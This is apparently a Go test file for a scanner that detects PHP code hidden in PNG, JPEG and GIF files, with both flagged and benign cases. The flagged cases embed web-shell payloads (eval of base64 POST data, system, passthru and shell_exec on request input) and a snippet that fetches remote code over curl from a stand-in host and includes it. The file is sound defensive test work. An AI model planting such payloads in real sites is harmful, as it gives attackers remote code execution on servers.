package daemon

import (
	"bytes"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"testing"
)

func testOnePixel() image.Image {
	img := image.NewRGBA(image.Rect(0, 0, 1, 1))
	img.Set(0, 0, color.RGBA{R: 9, G: 9, B: 9, A: 255})
	return img
}

func testPNG(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := png.Encode(&buf, testOnePixel()); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func testJPEG(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, testOnePixel(), nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func testGIF(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := gif.Encode(&buf, testOnePixel(), nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// The 2026-09-17 incident: a valid PNG whose trailing bytes hold PHP that
// pulls remote code over curl and runs it.
const remoteFetchPayload = `
<?php $ftp_url = "https://staging.example.test/rs/de.php";
$cu = curl_init();
curl_setopt_array($cu, array(CURLOPT_URL => $ftp_url, CURLOPT_RETURNTRANSFER => 1));
$datas = curl_exec($cu);
curl_close($cu);
include($datas);
`

func TestPHPExecutableContentFindsPayloadsCarriedByImages(t *testing.T) {
	cases := map[string][]byte{
		"png_trailing_remote_fetch": append(testPNG(t), []byte(remoteFetchPayload)...),
		"png_text_chunk_eval":       append(testPNG(t), []byte("tEXtComment\x00<?php eval(base64_decode($_POST['c'])); ?>")...),
		"jpeg_appended_shell":       append(testJPEG(t), []byte("<?php system($_GET['cmd']); ?>")...),
		"gif_appended_shell":        append(testGIF(t), []byte("<?php passthru($_REQUEST['c']); ?>")...),
		"short_echo_tag_with_sink":  append(testGIF(t), []byte("<?= shell_exec('id') ?>")...),
		"minified_include":          append(testPNG(t), []byte("<?php include'payload.dat';")...),
	}
	for name, data := range cases {
		t.Run(name, func(t *testing.T) {
			evidence, found := phpExecutableContent(data)
			if !found {
				t.Fatalf("phpExecutableContent did not flag %s", name)
			}
			if evidence == "" {
				t.Fatal("finding carries no evidence for the operator")
			}
		})
	}
}

func TestPHPExecutableContentStaysQuietOnBenignContent(t *testing.T) {
	cases := map[string][]byte{
		"clean_png":  testPNG(t),
		"clean_jpeg": testJPEG(t),
		// A screenshot shipped by a plugin, whose tEXt comment quotes a PHP
		// opening tag from the plugin's own documentation. No sink, no fetch.
		"png_php_tag_in_comment": append(testPNG(t),
			[]byte("tEXtDescription\x00Usage: add <?php the_widget('demo'); ?> to your theme.")...),
		// Compressed pixel data is random bytes. A three-byte short-echo tag
		// and a backtick near a dollar sign both turn up by chance in a real
		// plugin asset, so neither is evidence of anything on its own.
		"png_coincidental_php_bytes": append(testPNG(t),
			[]byte("\xe8\x8d\r\x17<?=j\x16\n:q\xd0`<\xc1\xb1\xd4\xf89D5$\xe4\xfe\xf0")...),
		// Minified JavaScript naming an include helper carries no PHP opener.
		"minified_js": []byte(`!function(e){var t=e.include||function(n){return n};t("./sprite.png")}(window);`),
		// A documentation page quoting the opening tag inside a code sample.
		"docs_code_sample": []byte("<pre>Add <?php wp_head(); ?> to header.php</pre>"),
	}
	for name, data := range cases {
		t.Run(name, func(t *testing.T) {
			if evidence, found := phpExecutableContent(data); found {
				t.Fatalf("phpExecutableContent flagged %s: evidence=%q", name, evidence)
			}
		})
	}
}
